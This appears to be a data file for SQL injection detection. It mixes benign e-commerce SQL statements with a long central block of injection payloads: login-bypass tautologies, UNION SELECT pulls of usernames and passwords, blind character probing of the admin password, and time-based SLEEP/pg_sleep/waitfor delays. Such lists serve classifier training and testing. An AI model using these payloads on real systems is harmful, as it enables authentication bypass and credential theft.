SELECT * FROM products WHERE name LIKE '%mug%';
INSERT INTO products (name, price, stock) VALUES ('Ceramic Mug', 15.99, 100);
UPDATE products SET stock = stock + 50 WHERE name = 'Ceramic Mug';
DELETE FROM products WHERE name = 'Ceramic Mug';
CREATE TABLE user_sessions (id INT PRIMARY KEY, user_id INT, session_id VARCHAR(255), created_at TIMESTAMP);
INSERT INTO user_sessions (user_id, session_id, created_at) VALUES (1, 'session789', NOW());
SELECT * FROM user_sessions WHERE user_id = 1;
UPDATE user_sessions SET session_id = 'session101' WHERE id = 1;
DELETE FROM user_sessions WHERE id = 1;
SELECT * FROM orders WHERE created_at < '2023-01-01';
INSERT INTO orders (user_id, total) VALUES (1, 400.00);
UPDATE orders SET total = total - 100 WHERE user_id = 1;
DELETE FROM orders WHERE total > 500;
CREATE TABLE user_feedback (id INT PRIMARY KEY, user_id INT, feedback TEXT, created_at TIMESTAMP);
INSERT INTO user_feedback (user_id, feedback, created_at) VALUES (1, 'Great service!', NOW());
SELECT * FROM user_feedback WHERE user_id = 1;
UPDATE user_feedback SET feedback = 'Excellent service!' WHERE id = 1;
DELETE FROM user_feedback WHERE id = 1;
SELECT * FROM products WHERE stock > 0;
INSERT INTO products (name, price, stock) VALUES ('Water Bottle', 19.99, 150);
UPDATE products SET stock = stock - 10 WHERE name = 'Water Bottle';
DELETE FROM products WHERE name = 'Water Bottle';
CREATE TABLE product_tags (id INT PRIMARY KEY, product_id INT, tag VARCHAR(50));
INSERT INTO product_tags (product_id, tag) VALUES (1, 'Beverage');
SELECT * FROM product_tags WHERE product_id = 1;
UPDATE product_tags SET tag = 'Drink' WHERE id = 1;
DELETE FROM product_tags WHERE id = 1;
SELECT * FROM users WHERE name LIKE '%a%';
INSERT INTO users (name, email) VALUES ('Ivy', 'ivy@example.com');
UPDATE users SET email = 'ivy_new@example.com' WHERE name = 'Ivy';
DELETE FROM users WHERE email = 'ivy_new@example.com';
CREATE TABLE shipping_addresses (id INT PRIMARY KEY, user_id INT, address VARCHAR(255));
INSERT INTO shipping_addresses (user_id, address) VALUES (1, '123 Maple St');
SELECT * FROM shipping_addresses WHERE user_id = 1;
UPDATE shipping_addresses SET address = '456 Birch St' WHERE id = 1;
DELETE FROM shipping_addresses WHERE id = 1;
SELECT * FROM products WHERE price < 30;
INSERT INTO products (name, price, stock) VALUES ('Notebook', 5.99, 200);
UPDATE products SET stock = stock + 100 WHERE name = 'Notebook';
DELETE FROM products WHERE name = 'Notebook';
CREATE TABLE user_orders (id INT PRIMARY KEY, user_id INT, order_id INT);
INSERT INTO user_orders (user_id, order_id) VALUES (1, 1);
SELECT * FROM user_orders WHERE user_id = 1;
UPDATE user_orders SET order_id = 2 WHERE id = 1;
DELETE FROM user_orders WHERE id = 1;
ALTER TABLE users ADD COLUMN status VARCHAR(20);
CREATE DATABASE my_database;
CREATE TABLE users (id INT PRIMARY KEY, name VARCHAR(100), email VARCHAR(100));
CREATE TABLE products (id INT PRIMARY KEY, name VARCHAR(100), price DECIMAL(10, 2), stock INT);
CREATE TABLE orders (id INT PRIMARY KEY, user_id INT, total DECIMAL(10, 2), created_at TIMESTAMP);
CREATE TABLE categories (id INT PRIMARY KEY, name VARCHAR(100));
INSERT INTO users (name, email) VALUES ('Alice', 'alice@example.com');
INSERT INTO products (name, price, stock) VALUES ('Laptop', 999.99, 50);
INSERT INTO categories (name) VALUES ('Electronics');
INSERT INTO orders (user_id, total, created_at) VALUES (1, 150.00, NOW());
SELECT * FROM users;
SELECT name, email FROM users WHERE id = 1;
SELECT * FROM products WHERE price > 100;
SELECT COUNT(*) FROM users;
SELECT AVG(price) FROM products;
SELECT MAX(price) FROM products;
SELECT MIN(price) FROM products;
SELECT DISTINCT name FROM categories;
SELECT * FROM orders WHERE user_id = 1;
UPDATE users SET email = 'alice_new@example.com' WHERE name = 'Alice';
UPDATE products SET stock = stock - 1 WHERE id = 1;
UPDATE orders SET total = total * 0.9 WHERE id = 1;
DELETE FROM users WHERE id = 1;
DELETE FROM products WHERE id = 1;
DELETE FROM orders WHERE id = 1;
ALTER TABLE users ADD COLUMN age INT;
ALTER TABLE products ADD COLUMN description TEXT;
ALTER TABLE orders ADD COLUMN status VARCHAR(20);
CREATE INDEX idx_user_email ON users (email);
CREATE UNIQUE INDEX idx_product_name ON products (name);
DROP INDEX idx_user_email;
DROP TABLE IF EXISTS categories;
DROP DATABASE IF EXISTS my_database;
SELECT * FROM users WHERE age IS NOT NULL;
SELECT * FROM products WHERE stock < 10;
INSERT INTO users (name, email) VALUES ('Bob', 'bob@example.com');
SELECT * FROM users WHERE email LIKE '%@example.com';
SELECT * FROM products WHERE name LIKE 'Lap%';
UPDATE products SET price = price * 1.1 WHERE stock < 5;
DELETE FROM products WHERE stock = 0;
SELECT * FROM orders WHERE created_at >= NOW() - INTERVAL '30 days';
SELECT COUNT(*) FROM orders WHERE total > 100;
INSERT INTO orders (user_id, total) VALUES (2, 200.00);
SELECT * FROM orders WHERE total BETWEEN 100 AND 250;
SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id;
SELECT c.name, COUNT(p.id) FROM categories c LEFT JOIN products p ON c.id = p.category_id GROUP BY c.name;
UPDATE users SET age = 30 WHERE name = 'Alice';
DELETE FROM orders WHERE total < 50;
ALTER TABLE users DROP COLUMN age;
CREATE TABLE reviews (id INT PRIMARY KEY, product_id INT, user_id INT, rating INT, comment TEXT);
INSERT INTO reviews (product_id, user_id, rating, comment) VALUES (1, 1, 5, 'Excellent product!');
SELECT * FROM reviews WHERE product_id = 1;
UPDATE reviews SET rating = 4 WHERE id = 1;
DELETE FROM reviews WHERE id = 1;
CREATE VIEW user_orders AS SELECT u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id;
SELECT * FROM user_orders;
CREATE TABLE inventory (id INT PRIMARY KEY, product_id INT, quantity INT);
INSERT INTO inventory (product_id, quantity) VALUES (1, 100);
SELECT * FROM inventory WHERE product_id = 1;
UPDATE inventory SET quantity = quantity - 10 WHERE product_id = 1;
DELETE FROM inventory WHERE product_id = 1;
SELECT u.name, SUM(o.total) FROM users u JOIN orders o ON u.id = o.user_id GROUP BY u.name;
INSERT INTO categories (name) VALUES ('Home Appliances');
SELECT * FROM categories;
UPDATE categories SET name = 'Kitchen Appliances' WHERE name = 'Home Appliances';
DELETE FROM categories WHERE name = 'Kitchen Appliances';
CREATE TABLE discounts (id INT PRIMARY KEY, product_id INT, discount_percentage INT);
INSERT INTO discounts (product_id, discount_percentage) VALUES (1, 10);
SELECT * FROM discounts WHERE product_id = 1;
UPDATE discounts SET discount_percentage = 15 WHERE id = 1;
DELETE FROM discounts WHERE id = 1;
ALTER TABLE products ADD COLUMN discount_price DECIMAL(10, 2);
INSERT INTO products (name, price, stock, discount_price) VALUES ('Bluetooth Speaker', 79.99, 100, 69.99);
SELECT * FROM products WHERE discount_price < price;
UPDATE products SET discount_price = price * 0.8 WHERE name = 'Bluetooth Speaker';
DELETE FROM products WHERE name = 'Bluetooth Speaker';
CREATE TABLE user_roles (id INT PRIMARY KEY, user_id INT, role VARCHAR(50));
INSERT INTO user_roles (user_id, role) VALUES (1, 'admin');
SELECT * FROM user_roles WHERE user_id = 1;
UPDATE user_roles SET role = 'super_admin' WHERE id = 1;
DELETE FROM user_roles WHERE id = 1;
SELECT * FROM users WHERE role = 'admin';
INSERT INTO products (name, price, stock) VALUES ('Gaming Console', 499.99, 25);
UPDATE products SET stock = stock - 1 WHERE name = 'Gaming Console';
DELETE FROM products WHERE name = 'Gaming Console';
CREATE TABLE logs (id INT PRIMARY KEY, user_id INT, action VARCHAR(255), created_at TIMESTAMP);
INSERT INTO logs (user_id, action, created_at) VALUES (1, 'User created', NOW());
SELECT * FROM logs WHERE user_id = 1;
UPDATE logs SET action = 'User updated' WHERE id = 1;
DELETE FROM logs WHERE id = 1;
SELECT * FROM orders WHERE created_at < '2023-01-01';
INSERT INTO orders (user_id, total) VALUES (1, 300.00);
UPDATE orders SET total = total - 100 WHERE user_id = 1;
DELETE FROM orders WHERE total > 500;
CREATE TABLE coupons (id INT PRIMARY KEY, code VARCHAR(50), discount INT);
INSERT INTO coupons (code, discount) VALUES ('SAVE10', 10);
SELECT * FROM coupons WHERE code = 'SAVE10';
UPDATE coupons SET discount = 15 WHERE code = 'SAVE10';
DELETE FROM coupons WHERE code = 'SAVE10';
SELECT * FROM products WHERE price BETWEEN 50 AND 100;
INSERT INTO products (name, price, stock) VALUES ('Coffee Maker', 79.99, 80);
UPDATE products SET stock = stock - 5 WHERE name = 'Coffee Maker';
DELETE FROM products WHERE name = 'Coffee Maker';
CREATE TABLE wishlists (id INT PRIMARY KEY, user_id INT, product_id INT);
INSERT INTO wishlists (user_id, product_id) VALUES (1, 1);
SELECT * FROM wishlists WHERE user_id = 1;
UPDATE wishlists SET product_id = 2 WHERE id = 1;
DELETE FROM wishlists WHERE id = 1;
ALTER TABLE users ADD COLUMN last_login TIMESTAMP;
INSERT INTO users (name, email, last_login) VALUES ('Hannah', 'hannah@example.com', NOW());
SELECT * FROM users WHERE last_login IS NOT NULL;
UPDATE users SET last_login = NOW() WHERE name = 'Hannah';
DELETE FROM users WHERE last_login < NOW() - INTERVAL '1 year';
CREATE TABLE transactions (id INT PRIMARY KEY, order_id INT, amount DECIMAL(10, 2), created_at TIMESTAMP);
INSERT INTO transactions (order_id, amount, created_at) VALUES (1, 150.00, NOW());
SELECT * FROM transactions WHERE order_id = 1;
UPDATE transactions SET amount = amount + 10 WHERE id = 1;
DELETE FROM transactions WHERE id = 1;
SELECT * FROM products WHERE name LIKE '%mug%';
INSERT INTO products (name, price, stock) VALUES ('Ceramic Mug', 15.99, 100);
UPDATE products SET stock = stock + 50 WHERE name = 'Ceramic Mug';
DELETE FROM products WHERE name = 'Ceramic Mug';
CREATE TABLE user_sessions (id INT PRIMARY KEY, user_id INT, session_id VARCHAR(255), created_at TIMESTAMP);
INSERT INTO user_sessions (user_id, session_id, created_at) VALUES (1, 'session123', NOW());
SELECT * FROM user_sessions WHERE user_id = 1;
UPDATE user_sessions SET session_id = 'session456' WHERE id = 1;
DELETE FROM user_sessions WHERE id = 1;
SELECT * FROM orders WHERE user_id = 1;
INSERT INTO orders (user_id, total) VALUES (1, 400.00);
UPDATE orders SET total = total - 100 WHERE user_id = 1;
DELETE FROM orders WHERE total > 500;
CREATE TABLE user_feedback (id INT PRIMARY KEY, user_id INT, feedback TEXT, created_at TIMESTAMP);
INSERT INTO user_feedback (user_id, feedback, created_at) VALUES (1, 'Great service!', NOW());
SELECT * FROM user_feedback WHERE user_id = 1;
UPDATE user_feedback SET feedback = 'Excellent service!' WHERE id = 1;
DELETE FROM user_feedback WHERE id = 1;
SELECT * FROM products WHERE stock > 0;
INSERT INTO products (name, price, stock) VALUES ('Water Bottle', 19.99, 150);
UPDATE products SET stock = stock - 10 WHERE name = 'Water Bottle';
DELETE FROM products WHERE name = 'Water Bottle';
CREATE TABLE product_tags (id INT PRIMARY KEY, product_id INT, tag VARCHAR(50));
INSERT INTO product_tags (product_id, tag) VALUES (1, 'Beverage');
SELECT * FROM product_tags WHERE product_id = 1;
UPDATE product_tags SET tag = 'Drink' WHERE id = 1;
DELETE FROM product_tags WHERE id = 1;
SELECT * FROM users WHERE name LIKE '%a%';
INSERT INTO users (name, email) VALUES ('Ivy', 'ivy@example.com');
UPDATE users SET email = 'ivy_new@example.com' WHERE name = 'Ivy';
DELETE FROM users WHERE email = 'ivy_new@example.com';
CREATE TABLE shipping_addresses (id INT PRIMARY KEY, user_id INT, address VARCHAR(255));
INSERT INTO shipping_addresses (user_id, address) VALUES (1, '123 Maple St');
SELECT * FROM shipping_addresses WHERE user_id = 1;
UPDATE shipping_addresses SET address = '456 Birch St' WHERE id = 1;
DELETE FROM shipping_addresses WHERE id = 1;
SELECT * FROM products WHERE price < 30;
INSERT INTO products (name, price, stock) VALUES ('Notebook', 5.99, 200);
UPDATE products SET stock = stock + 100 WHERE name = 'Notebook';
DELETE FROM products WHERE name = 'Notebook';
CREATE TABLE user_orders (id INT PRIMARY KEY, user_id INT, order_id INT);
INSERT INTO user_orders (user_id, order_id) VALUES (1, 1);
SELECT * FROM user_orders WHERE user_id = 1;
UPDATE user_orders SET order_id = 2 WHERE id = 1;
DELETE FROM user_orders WHERE id = 1;
ALTER TABLE users ADD COLUMN status VARCHAR(20);
INSERT INTO users (name, email, status) VALUES ('Jack', 'jack@example.com', 'active');
SELECT * FROM users WHERE status = 'active';
UPDATE users SET status = 'inactive' WHERE name = 'Jack';
DELETE FROM users WHERE status = 'inactive';
CREATE TABLE sessions (id INT PRIMARY KEY, user_id INT, session_token VARCHAR(255), created_at TIMESTAMP);
INSERT INTO sessions (user_id, session_token, created_at) VALUES (1, 'token123', NOW());
SELECT * FROM sessions WHERE user_id = 1;
UPDATE sessions SET session_token = 'token456' WHERE id = 1;
DELETE FROM sessions WHERE id = 1;
SELECT * FROM orders WHERE created_at >= '2023-01-01';
INSERT INTO orders (user_id, total) VALUES (1, 500.00);
UPDATE orders SET total = total + 50 WHERE user_id = 1;
DELETE FROM orders WHERE total < 100;
CREATE TABLE notifications (id INT PRIMARY KEY, user_id INT, message TEXT, created_at TIMESTAMP);
INSERT INTO notifications (user_id, message, created_at) VALUES (1, 'Welcome!', NOW());
SELECT * FROM notifications WHERE user_id = 1;
UPDATE notifications SET message = 'Updated Welcome!' WHERE id = 1;
DELETE FROM notifications WHERE id = 1;
SELECT * FROM products WHERE price > 100;
INSERT INTO products (name, price, stock) VALUES ('Electric Kettle', 49.99, 150);
UPDATE products SET stock = stock + 20 WHERE name = 'Electric Kettle';
DELETE FROM products WHERE name = 'Electric Kettle';
CREATE TABLE subscriptions (id INT PRIMARY KEY, user_id INT, plan VARCHAR(50), start_date TIMESTAMP);
INSERT INTO subscriptions (user_id, plan, start_date) VALUES (1, 'Premium', NOW());
SELECT * FROM subscriptions WHERE user_id = 1;
UPDATE subscriptions SET plan = 'Basic' WHERE id = 1;
DELETE FROM subscriptions WHERE id = 1;
SELECT * FROM users WHERE created_at < '2023-01-01';
INSERT INTO users (name, email) VALUES ('Liam', 'liam@example.com');
UPDATE users SET email = 'liam_new@example.com' WHERE name = 'Liam';
DELETE FROM users WHERE email = 'liam_new@example.com';
CREATE TABLE user_activity (id INT PRIMARY KEY, user_id INT, activity VARCHAR(255), created_at TIMESTAMP);
INSERT INTO user_activity (user_id, activity, created_at) VALUES (1, 'Logged In', NOW());
SELECT * FROM user_activity WHERE user_id = 1;
UPDATE user_activity SET activity = 'Logged Out' WHERE id = 1;
DELETE FROM user_activity WHERE id = 1;
SELECT * FROM orders WHERE user_id = 1;
INSERT INTO orders (user_id, total) VALUES (1, 600.00);
UPDATE orders SET total = total - 100 WHERE user_id = 1;
DELETE FROM orders WHERE total > 700;
CREATE TABLE product_reviews (id INT PRIMARY KEY, product_id INT, user_id INT, review TEXT);
INSERT INTO product_reviews (product_id, user_id, review) VALUES (1, 1, 'Fantastic product!');
SELECT * FROM product_reviews WHERE product_id = 1;
UPDATE product_reviews SET review = 'Amazing product!' WHERE id = 1;
DELETE FROM product_reviews WHERE id = 1;
SELECT * FROM products WHERE stock > 0;
INSERT INTO products (name, price, stock) VALUES ('Smartphone', 699.99, 100);
UPDATE products SET stock = stock - 1 WHERE name = 'Smartphone';
DELETE FROM products WHERE name = 'Smartphone';
CREATE TABLE user_settings (id INT PRIMARY KEY, user_id INT, setting VARCHAR(50), value VARCHAR(50));
INSERT INTO user_settings (user_id, setting, value) VALUES (1, 'theme', 'dark');
SELECT * FROM user_settings WHERE user_id = 1;
UPDATE user_settings SET value = 'light' WHERE id = 1;
DELETE FROM user_settings WHERE id = 1;
SELECT * FROM users WHERE email LIKE '%@yahoo.com';
INSERT INTO users (name, email) VALUES ('Mia', 'mia@example.com');
UPDATE users SET email = 'mia_new@example.com' WHERE name = 'Mia';
DELETE FROM users WHERE email = 'mia_new@example.com';
CREATE TABLE session_logs (id INT PRIMARY KEY, session_id INT, log TEXT, created_at TIMESTAMP);
INSERT INTO session_logs (session_id, log, created_at) VALUES (1, 'Session started', NOW());
SELECT * FROM session_logs WHERE session_id = 1;
UPDATE session_logs SET log = 'Session ended' WHERE id = 1;
DELETE FROM session_logs WHERE id = 1;
SELECT * FROM orders WHERE created_at < '2023-01-01';
INSERT INTO orders (user_id, total) VALUES (1, 800.00);
UPDATE orders SET total = total - 200 WHERE user_id = 1;
DELETE FROM orders WHERE total < 100;
CREATE TABLE user_notifications (id INT PRIMARY KEY, user_id INT, notification TEXT, created_at TIMESTAMP);
INSERT INTO user_notifications (user_id, notification, created_at) VALUES (1, 'You have a new message!', NOW());
SELECT * FROM user_notifications WHERE user_id = 1;
UPDATE user_notifications SET notification = 'You have 2 new messages!' WHERE id = 1;
DELETE FROM user_notifications WHERE id = 1;
SELECT * FROM products WHERE price > 50;
INSERT INTO products (name, price, stock) VALUES ('Electric Toothbrush', 29.99, 200);
UPDATE products SET stock = stock + 30 WHERE name = 'Electric Toothbrush';
DELETE FROM products WHERE name = 'Electric Toothbrush';
CREATE TABLE user_preferences (id INT PRIMARY KEY, user_id INT, preference VARCHAR(50));
INSERT INTO user_preferences (user_id, preference) VALUES (1, 'Email Notifications');
SELECT * FROM user_preferences WHERE user_id = 1;
UPDATE user_preferences SET preference = 'SMS Notifications
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
' OR 1=1 --
' OR 1=1 /*
' OR 'a'='a
' OR 'a'='a' --
' OR 'a'='a' /*
' OR 1=1#
' OR 1=1; --
' UNION SELECT NULL, username, password FROM users --
' UNION SELECT ALL FROM users --
' UNION SELECT table_name FROM information_schema.tables --
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
' AND (SELECT SUBSTRING(@@version,1,1))='5' --
' AND (SELECT COUNT(*) FROM users) > 0 --
' AND EXISTS(SELECT * FROM users WHERE username='admin') --
' AND NOT 1=1 --
' AND 1=2 UNION SELECT username, password FROM users --
' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 0 --
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 0 --
' AND 1=1 LIMIT 1; --
' AND 1=1 ORDER BY 1 --
' AND 1=1 GROUP BY CONCAT(username, password) HAVING 1=1 --
' AND 1=1 GROUP BY username HAVING 1=1 --
' AND 1=1 GROUP BY password HAVING 1=1 --
' AND 1=1 GROUP BY CONCAT(CHAR(65),CHAR(66)) HAVING 1=1 --
' AND (SELECT COUNT(*) FROM users) > 0 --
' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 0 --
' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a' --
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
' OR 1=1 --
' OR 1=1 /*
' OR 'a'='a
' OR 'a'='a' --
' OR 'a'='a' /*
' OR 1=1#
' OR 1=1; --
' UNION SELECT NULL, username, password FROM users --
' UNION SELECT ALL FROM users --
' UNION SELECT table_name FROM information_schema.tables --
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
' AND (SELECT SUBSTRING(@@version,1,1))='5' --
' AND (SELECT COUNT(*) FROM users) > 0 --
' AND EXISTS(SELECT * FROM users WHERE username='admin') --
' AND NOT 1=1 --
' AND 1=2 UNION SELECT username, password FROM users --
' AND (SELECT LENGTH(password) FROM users WHERE username='admin') > 0 --
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 0 --
' AND 1=1 LIMIT 1; --
' AND 1=1 ORDER BY 10 --
' AND 1=1 GROUP BY CONCAT(username, password) HAVING 1=1 --
' AND 1=1 GROUP BY username HAVING 1=1 --
' AND 1=1 GROUP BY password HAVING 1=1 --
' AND 1=1 GROUP BY CONCAT(CHAR(65),CHAR(66)) HAVING 1=1 --
' AND (SELECT COUNT(*) FROM users) > 0 --
' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 0 --
' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a' --
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
OR 1=1
OR 1=0
OR x=x
OR x=y
OR 1=1#
OR 1=0#
OR x=x#
OR x=y#
OR 1=1-- 
OR 1=0-- 
OR x=x-- 
OR x=y-- 
OR 3409=3409 AND ('pytW' LIKE 'pytW
OR 3409=3409 AND ('pytW' LIKE 'pytY
HAVING 1=1
HAVING 1=0
HAVING 1=1#
HAVING 1=0#
HAVING 1=1-- 
HAVING 1=0-- 
AND 1=1
AND 1=0
AND 1=1-- 
AND 1=0-- 
AND 1=1#
AND 1=0#
AND 1=1 AND '%'='
AND 1=0 AND '%'='
AND 1083=1083 AND (1427=1427
AND 7506=9091 AND (5913=5913AND 7300=7300 AND ('pKlZ'='pKlY
AS INJECTX WHERE 1=1 AND 1=1
AS INJECTX WHERE 1=1 AND 1=0
AS INJECTX WHERE 1=1 AND 1=1#
AS INJECTX WHERE 1=1 AND 1=0#
AS INJECTX WHERE 1=1 AND 1=1--
AS INJECTX WHERE 1=1 AND 1=0--
WHERE 1=1 AND 1=1
WHERE 1=1 AND 1=0
WHERE 1=1 AND 1=1#
WHERE 1=1 AND 1=0#
WHERE 1=1 AND 1=1--
WHERE 1=1 AND 1=0--
ORDER BY 1-- 
ORDER BY 29 
ORDER BY 30 
ORDER BY 31337 
RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
%' AND 8310=8310 AND '%'='
%' AND 8310=8311 AND '%'='
and (select substring(@@version,1,1))='X'
sleep(5)#
1 or sleep(5)#
" or sleep(5)#
' or sleep(5)#
" or sleep(5)="
' or sleep(5)='
1) or sleep(5)#
") or sleep(5)="
') or sleep(5)='
1)) or sleep(5)#
")) or sleep(5)="
')) or sleep(5)='
;waitfor delay '0:0:5'--
);waitfor delay '0:0:5'--
';waitfor delay '0:0:5'--
');waitfor delay '0:0:5'--
));waitfor delay '0:0:5'--
'));waitfor delay '0:0:5'--
benchmark(10000000,MD5(1))#
1 or benchmark(10000000,MD5(1))#
" or benchmark(10000000,MD5(1))#
pg_sleep(5)--
1 or pg_sleep(5)--
" or pg_sleep(5)--
' or pg_sleep(5)--
1) or pg_sleep(5)--
") or pg_sleep(5)--
') or pg_sleep(5)--
1)) or pg_sleep(5)--
")) or pg_sleep(5)--
')) or pg_sleep(5)--
AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
SLEEP(5)#
SLEEP(5)--
SLEEP(5)="
SLEEP(5)=
or SLEEP(5)
or SLEEP(5)#
or SLEEP(5)--
or SLEEP(5)="
or SLEEP(5)=
waitfor delay '00:00:05'
waitfor delay '00:00:05'--
waitfor delay '00:00:05'#
benchmark(50000000,MD5(1))
benchmark(50000000,MD5(1))--
benchmark(50000000,MD5(1))#
or benchmark(50000000,MD5(1))
or benchmark(50000000,MD5(1))--
or benchmark(50000000,MD5(1))#
pg_SLEEP(5)
pg_SLEEP(5)--
pg_SLEEP(5)#
or pg_SLEEP(5)
or pg_SLEEP(5)--
or pg_SLEEP(5)#
AnD SLEEP(5)
AnD SLEEP(5)--
AnD SLEEP(5)#
&&SLEEP(5)
&&SLEEP(5)--
&&SLEEP(5)#
' AnD SLEEP(5) ANd '1
'&&SLEEP(5)&&'1
ORDER BY SLEEP(5)
ORDER BY SLEEP(5)--
ORDER BY SLEEP(5)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+benchmark(3200,SHA1(1))+'
+ SLEEP(10) + '
RANDOMBLOB(500000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
RANDOMBLOB(1000000000/2)
AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
ORDER BY SLEEP(5)
ORDER BY 1,SLEEP(5)
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin'
SELECT name FROM customers;
SELECT * FROM orders WHERE order_date > '2023-01-01';
INSERT INTO products (name, price) VALUES ('Widget', 19.99);
UPDATE employees SET salary = salary * 1.05 WHERE department = 'Sales';
DELETE FROM sessions WHERE session_id = 12345;
SELECT COUNT(*) FROM users WHERE active = 1;
SELECT DISTINCT city FROM customers;
SELECT AVG(price) FROM products;
SELECT * FROM orders ORDER BY order_date DESC;
SELECT name, email FROM customers WHERE country = 'USA';
SELECT * FROM products WHERE price BETWEEN 10 AND 50;
SELECT MAX(salary) FROM employees;
SELECT * FROM orders WHERE customer_id IN (SELECT id FROM customers WHERE country = 'Canada');
INSERT INTO customers (name, email, country) VALUES ('John Doe', 'john@example.com', 'USA');
UPDATE products SET stock = stock - 1 WHERE id = 101;
DELETE FROM products WHERE id NOT IN (SELECT product_id FROM order_items);
SELECT * FROM employees WHERE hire_date < '2020-01-01' AND department = 'HR';
SELECT name, COUNT(*) FROM orders GROUP BY name;
SELECT * FROM customers WHERE name LIKE 'A%';
SELECT * FROM orders WHERE total > (SELECT AVG(total) FROM orders);
SELECT * FROM products WHERE name LIKE '%phone%';
SELECT * FROM customers WHERE EXISTS (SELECT * FROM orders WHERE customers.id = orders.customer_id);
SELECT department, SUM(salary) FROM employees GROUP BY department;
INSERT INTO orders (customer_id, order_date, total) VALUES (1, '2024-01-01', 100.00);
UPDATE customers SET last_login = NOW() WHERE id = 1;
DELETE FROM employees WHERE department = 'Interns';
SELECT * FROM products WHERE stock < 10 ORDER BY stock ASC;
SELECT name, email FROM customers WHERE email IS NOT NULL;
SELECT * FROM orders WHERE order_date BETWEEN '2024-01-01' AND '2024-12-31';
SELECT customer_id, COUNT(*) FROM orders GROUP BY customer_id HAVING COUNT(*) > 5;
SELECT * FROM employees WHERE salary IN (50000, 60000, 70000);
SELECT * FROM products WHERE price < (SELECT AVG(price) FROM products);
SELECT DISTINCT country FROM customers ORDER BY country;
SELECT * FROM orders WHERE customer_id = (SELECT id FROM customers WHERE name = 'Alice');
SELECT * FROM products WHERE created_at >= '2023-01-01';
INSERT INTO employees (name, department, salary) VALUES ('Jane Smith', 'Marketing', 55000);
UPDATE orders SET status = 'shipped' WHERE order_id = 123;
DELETE FROM sessions WHERE created_at < NOW() - INTERVAL 30 DAY;
SELECT * FROM customers WHERE phone IS NOT NULL;
SELECT name, COUNT(*) AS order_count FROM orders GROUP BY name ORDER BY order_count DESC;
SELECT * FROM products WHERE category IN ('Electronics', 'Books');
SELECT * FROM employees WHERE department = 'IT' AND salary > 60000;
SELECT * FROM orders WHERE total > (SELECT AVG(total) FROM orders WHERE order_date >= '2023-01-01');
SELECT * FROM customers WHERE name LIKE '%son%';
SELECT * FROM products WHERE stock > 0 ORDER BY price DESC;
SELECT name, email FROM customers WHERE country = 'UK' AND active = 1;
SELECT product_id, SUM(quantity) FROM order_items GROUP BY product_id;
INSERT INTO products (name, price, stock) VALUES ('Gadget', 29.99, 100);
UPDATE customers SET email = 'newemail@example.com' WHERE id = 2;
DELETE FROM orders WHERE order_date < '2023-01-01';
SELECT * FROM employees WHERE hire_date BETWEEN '2019-01-01' AND '2020-12-31';
SELECT * FROM customers WHERE EXISTS (SELECT * FROM orders WHERE customers.id = orders.customer_id AND total > 100);
